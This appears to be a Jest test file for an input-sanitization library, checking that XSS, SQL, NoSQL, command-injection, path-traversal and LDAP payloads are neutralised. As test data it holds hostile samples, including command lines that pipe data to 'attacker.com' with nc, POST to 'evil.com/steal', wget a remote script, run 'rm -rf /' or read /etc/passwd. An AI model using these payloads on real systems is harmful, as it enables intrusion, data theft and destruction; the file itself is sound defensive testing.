/**
 * SECURITY TEST: CRITICAL-03 - Input Sanitization
 * 
 * Tests to validate that InputSanitizer effectively prevents XSS attacks,
 * SQL injection, and other injection vulnerabilities through comprehensive
 * input validation and sanitization.
 * 
 * VULNERABILITY FIXED:
 * - Missing input sanitization leading to XSS vulnerabilities
 * - Inadequate validation of user-generated content
 * - Potential for script injection through form inputs
 * - Missing encoding of HTML special characters
 * 
 * SECURITY IMPLEMENTATIONS TESTED:
 * - XSS prevention through HTML entity encoding
 * - SQL injection pattern detection and removal
 * - NoSQL injection prevention
 * - Command injection prevention
 * - Path traversal prevention
 * - LDAP injection prevention
 * - Comprehensive input validation
 */

import { describe, test, expect, beforeEach } from '@jest/globals';
import { InputSanitizer, sanitize } from '@/lib/security/input-sanitizer';

describe('CRITICAL-03: Input Sanitization Tests', () => {

  beforeEach(() => {
    // Reset sanitization statistics before each test
    InputSanitizer.resetStatistics();
  });

  describe('XSS Attack Prevention', () => {
    test('should prevent basic script tag injection', () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        '<script src="malicious.js"></script>',
        '<script>document.cookie="stolen"</script>',
        '<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>'
      ];
      
      maliciousInputs.forEach(input => {
        const result = InputSanitizer.sanitizeString(input);
        
        expect(result.isValid).toBe(true);
        expect(result.sanitizedValue).not.toContain('<script');
        expect(result.sanitizedValue).not.toContain('</script>');
        expect(result.appliedSanitizations).toContain('xss_html_escape');
        expect(result.warnings.some(w => w.includes('XSS'))).toBe(true);
      });
    });

    test('should prevent event handler injection', () => {
      const maliciousInputs = [
        '<img src="x" onerror="alert(1)">',
        '<div onclick="maliciousFunction()">Click me</div>',
        '<body onload="stealData()">',
        '<input onfocus="alert(1)" autofocus>',
        '<svg onload="alert(1)"></svg>'
      ];
      
      maliciousInputs.forEach(input => {
        const result = InputSanitizer.sanitizeString(input);
        
        expect(result.isValid).toBe(true);
        expect(result.sanitizedValue).not.toContain('onclick');
        expect(result.sanitizedValue).not.toContain('onerror');
        expect(result.sanitizedValue).not.toContain('onload');
        expect(result.sanitizedValue).not.toContain('onfocus');
        expect(result.appliedSanitizations).toContain('xss_html_escape');
      });
    });

    test('should prevent javascript: URL injection', () => {
      const maliciousInputs = [
        '<a href="javascript:alert(1)">Click</a>',
        '<img src="javascript:alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>',
        'javascript:void(0);alert(1)'
      ];
      
      maliciousInputs.forEach(input => {
        const result = InputSanitizer.sanitizeString(input);
        
        expect(result.isValid).toBe(true);
        expect(result.sanitizedValue).not.toContain('javascript:');
        expect(result.appliedSanitizations).toContain('xss_html_escape');
      });
    });

    test('should prevent data URI XSS attacks', () => {
      const maliciousInputs = [
        '<img src="data:text/html,<script>alert(1)</script>">',
        '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
        '<object data="data:text/html,<script>alert(1)</script>"></object>'
      ];
      
      maliciousInputs.forEach(input => {
        const result = InputSanitizer.sanitizeString(input);
        
        expect(result.isValid).toBe(true);
        expect(result.sanitizedValue).not.toContain('data:text/html');
        expect(result.appliedSanitizations).toContain('xss_html_escape');
      });
    });

    test('should prevent CSS expression attacks', () => {
      const maliciousInputs = [
        '<div style="background: expression(alert(1))">',
        '<span style="width: expression(alert(1))">',
        '<p style="height: expression(document.cookie=\'stolen\')">',
        '<div style="color: expression(maliciousFunction())">'
      ];
      
      maliciousInputs.forEach(input => {
        const result = InputSanitizer.sanitizeString(input);
        
        expect(result.isValid).toBe(true);
        expect(result.sanitizedValue).not.toContain('expression(');
        expect(result.appliedSanitizations).toContain('xss_html_escape');
      });
    });

    test('should prevent CSS @import attacks', () => {
      const maliciousInputs = [
        '<style>@import "malicious.css";</style>',
        '<div style="@import url(javascript:alert(1))">',
        '<link rel="stylesheet" href="@import url(javascript:alert(1))">'
      ];
      
      maliciousInputs.forEach(input => {
        const result = InputSanitizer.sanitizeString(input);
        
        expect(result.isValid).toBe(true);
        expect(result.sanitizedValue).not.toContain('@import');
        expect(result.appliedSanitizations).toContain('xss_html_escape');
      });
    });
  });

  describe('SQL Injection Prevention', () => {
    test('should detect and remove SQL injection patterns', () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "1 OR 1=1",
        "admin'--",
        "1'; INSERT INTO users VALUES('hacker','password'); --",
        "UNION SELECT password FROM users",
        "1 OR 'a'='a'",
        "; EXEC xp_cmdshell('dir')",
        "'; DELETE FROM appointments WHERE id='1"
      ];
      
      maliciousInputs.forEach(input => {
        const result = InputSanitizer.sanitizeString(input);
        
        expect(result.isValid).toBe(true);
        expect(result.appliedSanitizations).toContain('sql_injection_removal');
        expect(result.warnings.some(w => w.includes('SQL injection'))).toBe(true);
        
        // Should not contain common SQL keywords
        const sanitized = result.sanitizedValue.toLowerCase();
        expect(sanitized).not.toContain('drop table');
        expect(sanitized).not.toContain('delete from');
        expect(sanitized).not.toContain('insert into');
        expect(sanitized).not.toContain('union select');
        expect(sanitized).not.toContain('exec');
      });
    });

    test('should handle SQL injection in numeric contexts', () => {
      const maliciousInputs = [
        "1 OR 1=1",
        "1 AND 1=1",
        "1; DROP TABLE users",
        "1 UNION SELECT * FROM users"
      ];
      
      maliciousInputs.forEach(input => {
        const result = InputSanitizer.sanitizeString(input);
        
        expect(result.appliedSanitizations).toContain('sql_injection_removal');
        expect(result.warnings.some(w => w.includes('SQL injection'))).toBe(true);
      });
    });

    test('should preserve legitimate data while removing SQL patterns', () => {
      const legitimateInput = "User's favorite restaurant is O'Connor's Pub";
      const result = InputSanitizer.sanitizeString(legitimateInput);
      
      expect(result.isValid).toBe(true);
      expect(result.sanitizedValue).toContain("O'Connor's");
      // Should not trigger false positives for legitimate apostrophes
      expect(result.warnings.length).toBe(0);
    });
  });

  describe('NoSQL Injection Prevention', () => {
    test('should detect and remove NoSQL injection patterns', () => {
      const maliciousInputs = [
        '{"$where": "this.username == this.password"}',
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        'db.users.find()',
        'collection.drop()',
        '{"$or": [{"username": "admin"}, {"role": "admin"}]}'
      ];
      
      maliciousInputs.forEach(input => {
        const result = InputSanitizer.sanitizeString(input);
        
        expect(result.isValid).toBe(true);
        expect(result.appliedSanitizations).toContain('nosql_injection_removal');
        expect(result.warnings.some(w => w.includes('NoSQL injection'))).toBe(true);
        
        // Should not contain NoSQL operators
        expect(result.sanitizedValue).not.toContain('$where');
        expect(result.sanitizedValue).not.toContain('$ne');
        expect(result.sanitizedValue).not.toContain('$gt');
        expect(result.sanitizedValue).not.toContain('$regex');
      });
    });
  });

  describe('Command Injection Prevention', () => {
    test('should detect and remove command injection patterns', () => {
      const maliciousInputs = [
        'user; cat /etc/passwd',
        'file.txt && rm -rf /',
        '`wget malicious.com/script.sh`',
        'data | nc attacker.com 1234',
        'input > /dev/null; curl evil.com',
        'test $(whoami)',
        'user; ls -la',
        'file && curl -X POST http://evil.com/steal'
      ];
      
      maliciousInputs.forEach(input => {
        const result = InputSanitizer.sanitizeString(input);
        
        expect(result.isValid).toBe(true);
        expect(result.appliedSanitizations).toContain('command_injection_removal');
        expect(result.warnings.some(w => w.includes('command injection'))).toBe(true);
        
        // Should not contain command separators
        expect(result.sanitizedValue).not.toContain('&&');
        expect(result.sanitizedValue).not.toContain('||');
        expect(result.sanitizedValue).not.toContain(';');
        expect(result.sanitizedValue).not.toContain('`');
        expect(result.sanitizedValue).not.toContain('$(');
      });
    });

    test('should remove dangerous command keywords', () => {
      const maliciousInputs = [
        'user; cat sensitive.txt',
        'rm -rf important/',
        'chmod 777 file',
        'curl evil.com/payload',
        'wget malicious.script',
        'nc -l 1234',
        'telnet attacker.com',
        'eval(dangerous_code)'
      ];
      
      maliciousInputs.forEach(input => {
        const result = InputSanitizer.sanitizeString(input);
        
        expect(result.appliedSanitizations).toContain('command_injection_removal');
        
        const sanitized = result.sanitizedValue.toLowerCase();
        expect(sanitized).not.toContain('cat ');
        expect(sanitized).not.toContain('rm ');
        expect(sanitized).not.toContain('chmod');
        expect(sanitized).not.toContain('curl');
        expect(sanitized).not.toContain('wget');
        expect(sanitized).not.toContain('nc ');
        expect(sanitized).not.toContain('telnet');
        expect(sanitized).not.toContain('eval');
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    test('should detect and remove path traversal patterns', () => {
      const maliciousInputs = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd',
        '/etc/shadow',
        '/proc/version',
        '/sys/kernel/debug'
      ];
      
      maliciousInputs.forEach(input => {
        const result = InputSanitizer.sanitizeString(input);
        
        expect(result.isValid).toBe(true);
        expect(result.appliedSanitizations).toContain('path_traversal_removal');
        expect(result.warnings.some(w => w.includes('path traversal'))).toBe(true);
        
        // Should not contain traversal patterns
        expect(result.sanitizedValue).not.toContain('../');
        expect(result.sanitizedValue).not.toContain('..\\');
        expect(result.sanitizedValue).not.toContain('%2e%2e');
        expect(result.sanitizedValue).not.toContain('/etc/');
        expect(result.sanitizedValue).not.toContain('/proc/');
      });
    });

    test('should handle URL-encoded path traversal', () => {
      const maliciousInputs = [
        '%2e%2e%2f',
        '%2e%2e\\',
        '..%2f',
        '..%5c'
      ];
      
      maliciousInputs.forEach(input => {
        const result = InputSanitizer.sanitizeString(input);
        
        expect(result.appliedSanitizations).toContain('path_traversal_removal');
        expect(result.sanitizedValue).not.toContain('%2e%2e');
        expect(result.sanitizedValue).not.toContain('%2f');
        expect(result.sanitizedValue).not.toContain('%5c');
      });
    });
  });

  describe('LDAP Injection Prevention', () => {
    test('should detect and remove LDAP injection patterns', () => {
      const maliciousInputs = [
        '(|(uid=*)(cn=*))',
        '(&(objectClass=user)(|(uid=admin)(uid=root)))',
        '*(objectClass=*)',
        '(cn=*)(|(cn=admin))',
        String.fromCharCode(0) + 'admin', // null byte
        'user)(cn=*'
      ];
      
      maliciousInputs.forEach(input => {
        const result = InputSanitizer.sanitizeString(input);
        
        expect(result.isValid).toBe(true);
        expect(result.appliedSanitizations).toContain('ldap_injection_removal');
        expect(result.warnings.some(w => w.includes('LDAP injection'))).toBe(true);
        
        // Should not contain LDAP special characters
        expect(result.sanitizedValue).not.toContain('(');
        expect(result.sanitizedValue).not.toContain(')');
        expect(result.sanitizedValue).not.toContain('&');
        expect(result.sanitizedValue).not.toContain('|');
        expect(result.sanitizedValue).not.toContain('*');
        expect(result.sanitizedValue).not.toContain('!');
      });
    });

    test('should remove null bytes and control characters', () => {
      const maliciousInputs = [
        'user' + String.fromCharCode(0) + 'admin',
        'data' + String.fromCharCode(1) + 'payload',
        'input' + String.fromCharCode(0x1f) + 'injection'
      ];
      
      maliciousInputs.forEach(input => {
        const result = InputSanitizer.sanitizeString(input);
        
        expect(result.appliedSanitizations).toContain('control_character_removal');
        // Control characters should be removed
        expect(result.sanitizedValue).not.toContain('\0');
        expect(result.sanitizedValue).not.toContain('\x01');
        expect(result.sanitizedValue).not.toContain('\x1f');
      });
    });
  });

  describe('Object Sanitization', () => {
    test('should recursively sanitize object properties', () => {
      const maliciousObject = {
        name: '<script>alert("XSS")</script>',
        email: "admin'; DROP TABLE users; --",
        nested: {
          data: '$(rm -rf /)',
          safe: 'legitimate content'
        },
        array: [
          '<img src="x" onerror="alert(1)">',
          'safe content'
        ]
      };
      
      const result = InputSanitizer.sanitizeObject(maliciousObject);
      
      expect(result.report.isValid).toBe(true);
      expect(typeof result.sanitized).toBe('object');
      
      // Check nested sanitization
      expect(result.sanitized.name).not.toContain('<script>');
      expect(result.sanitized.email).not.toContain('DROP TABLE');
      expect(result.sanitized.nested.data).not.toContain('$(');
      expect(result.sanitized.nested.safe).toBe('legitimate content');
      expect(result.sanitized.array[0]).not.toContain('onerror');
      expect(result.sanitized.array[1]).toBe('safe content');
    });

    test('should handle object field limits', () => {
      const largeObject: any = {};
      // Create object with more than the limit of fields
      for (let i = 0; i < 150; i++) {
        largeObject[`field${i}`] = `value${i}`;
      }
      
      const result = InputSanitizer.sanitizeObject(largeObject);
      
      expect(result.report.warnings.some(w => w.includes('field limit'))).toBe(true);
      expect(result.report.appliedSanitizations).toContain('object_field_limit');
    });

    test('should handle array length limits', () => {
      const largeArray = Array.from({ length: 150 }, (_, i) => `item${i}`);
      
      const result = InputSanitizer.sanitizeObject(largeArray);
      
      expect(result.report.warnings.some(w => w.includes('truncated'))).toBe(true);
      expect(result.report.appliedSanitizations).toContain('array_truncation');
    });
  });

  describe('Specialized Sanitizers', () => {
    test('should sanitize email addresses', () => {
      const testEmails = [
        'user@example.com',
        'test+tag@domain.co.uk',
        '<script>alert(1)</script>@evil.com',
        "admin'; DROP TABLE users; --@example.com",
        'toolongemailaddress' + 'a'.repeat(300) + '@example.com'
      ];
      
      testEmails.forEach(email => {
        const result = InputSanitizer.sanitizeEmail(email);
        
        if (email.includes('script') || email.includes('DROP TABLE') || email.length > 254) {
          expect(result.isValid).toBe(false);
          expect(result.errors.length).toBeGreaterThan(0);
        } else {
          expect(result.isValid).toBe(true);
          expect(result.sanitizedValue).toMatch(/@/);
        }
      });
    });

    test('should sanitize phone numbers', () => {
      const testPhones = [
        '+1 (555) 123-4567',
        '555.123.4567',
        '<script>alert(1)</script>',
        '555-123-4567 ext 123'
      ];
      
      testPhones.forEach(phone => {
        const result = InputSanitizer.sanitizePhoneNumber(phone);
        
        expect(result.isValid).toBe(true);
        expect(result.sanitizedValue).not.toContain('<script>');
        expect(result.sanitizedValue).not.toContain('alert');
        // Should only contain digits and valid phone characters
        expect(/^[0-9+\-() ]*$/.test(result.sanitizedValue)).toBe(true);
      });
    });

    test('should sanitize URLs', () => {
      const testUrls = [
        'https://example.com',
        'http://test.org/path',
        'javascript:alert(1)',
        '<script>alert(1)</script>',
        'ftp://files.example.com'
      ];
      
      testUrls.forEach(url => {
        const result = InputSanitizer.sanitizeUrl(url);
        
        expect(result.isValid).toBe(true);
        expect(result.sanitizedValue).not.toContain('<script>');
        expect(result.sanitizedValue).not.toContain('javascript:');
        
        if (!url.startsWith('http://') && !url.startsWith('https://')) {
          expect(result.warnings.some(w => w.includes('should start with http'))).toBe(true);
        }
      });
    });

    test('should sanitize names', () => {
      const testNames = [
        "John O'Connor",
        'Jane Doe-Smith',
        '<script>alert(1)</script>',
        "Robert'; DROP TABLE users; --",
        'A' + 'very'.repeat(50) + 'longname'
      ];
      
      testNames.forEach(name => {
        const result = InputSanitizer.sanitizeName(name);
        
        expect(result.isValid).toBe(true);
        expect(result.sanitizedValue).not.toContain('<script>');
        expect(result.sanitizedValue).not.toContain('DROP TABLE');
        expect(result.sanitizedValue.length).toBeLessThanOrEqual(100);
      });
    });
  });

  describe('Security Reporting and Statistics', () => {
    test('should track sanitization statistics', () => {
      InputSanitizer.resetStatistics();
      
      // Perform various sanitizations
      InputSanitizer.sanitizeString('<script>alert(1)</script>');
      InputSanitizer.sanitizeString("'; DROP TABLE users; --");
      InputSanitizer.sanitizeString('$(rm -rf /)');
      InputSanitizer.sanitizeString('legitimate input');
      
      const report = InputSanitizer.getSanitizationReport();
      
      expect(report.totalInputs).toBe(4);
      expect(report.sanitizedInputs).toBe(3); // 3 had sanitizations applied
      expect(report.patterns.xssAttempts).toBe(1);
      expect(report.patterns.sqlInjectionAttempts).toBe(1);
      expect(report.patterns.commandInjectionAttempts).toBe(1);
    });

    test('should provide detailed validation results', () => {
      const maliciousInput = '<script>alert(1)</script>; DROP TABLE users; $(rm -rf /)';
      const result = InputSanitizer.sanitizeString(maliciousInput);
      
      expect(result.isValid).toBe(true);
      expect(result.originalValue).toBe(maliciousInput);
      expect(result.sanitizedValue).not.toBe(maliciousInput);
      expect(result.appliedSanitizations.length).toBeGreaterThan(0);
      expect(result.warnings.length).toBeGreaterThan(0);
      
      // Should have detected multiple attack patterns
      expect(result.appliedSanitizations).toContain('xss_html_escape');
      expect(result.appliedSanitizations).toContain('sql_injection_removal');
      expect(result.appliedSanitizations).toContain('command_injection_removal');
    });
  });

  describe('Quick Sanitization Functions', () => {
    test('should provide quick sanitization utilities', () => {
      const maliciousString = '<script>alert(1)</script>';
      
      const sanitized = sanitize.string(maliciousString);
      expect(sanitized).not.toContain('<script>');
      
      const maliciousObject = { data: '<script>alert(1)</script>' };
      const sanitizedObj = sanitize.object(maliciousObject);
      expect(sanitizedObj.data).not.toContain('<script>');
      
      const maliciousEmail = '<script>alert(1)</script>@evil.com';
      const sanitizedEmail = sanitize.email(maliciousEmail);
      expect(sanitizedEmail).not.toContain('<script>');
    });
  });

  describe('Edge Cases and Error Handling', () => {
    test('should handle null and undefined inputs', () => {
      const nullResult = InputSanitizer.sanitizeString(null);
      const undefinedResult = InputSanitizer.sanitizeString(undefined);
      
      expect(nullResult.isValid).toBe(true);
      expect(nullResult.sanitizedValue).toBe('');
      expect(undefinedResult.isValid).toBe(true);
      expect(undefinedResult.sanitizedValue).toBe('');
    });

    test('should handle non-string types', () => {
      const numberResult = InputSanitizer.sanitizeString(12345);
      const booleanResult = InputSanitizer.sanitizeString(true);
      const arrayResult = InputSanitizer.sanitizeString(['a', 'b']);
      
      expect(numberResult.appliedSanitizations).toContain('type_conversion');
      expect(booleanResult.appliedSanitizations).toContain('type_conversion');
      expect(arrayResult.appliedSanitizations).toContain('type_conversion');
    });

    test('should handle very large inputs', () => {
      const largeInput = 'A'.repeat(100000);
      const result = InputSanitizer.sanitizeString(largeInput);
      
      expect(result.appliedSanitizations).toContain('length_truncation');
      expect(result.sanitizedValue.length).toBeLessThanOrEqual(50000);
      expect(result.warnings.some(w => w.includes('truncated'))).toBe(true);
    });

    test('should preserve newlines when configured', () => {
      const multilineInput = 'Line 1\nLine 2\rLine 3\r\nLine 4';
      
      const preserveResult = InputSanitizer.sanitizeString(multilineInput, { 
        preserveNewlines: true 
      });
      const removeResult = InputSanitizer.sanitizeString(multilineInput, { 
        preserveNewlines: false 
      });
      
      expect(preserveResult.sanitizedValue).toContain('\n');
      expect(removeResult.sanitizedValue).not.toContain('\n');
      expect(removeResult.appliedSanitizations).toContain('newline_removal');
    });
  });
});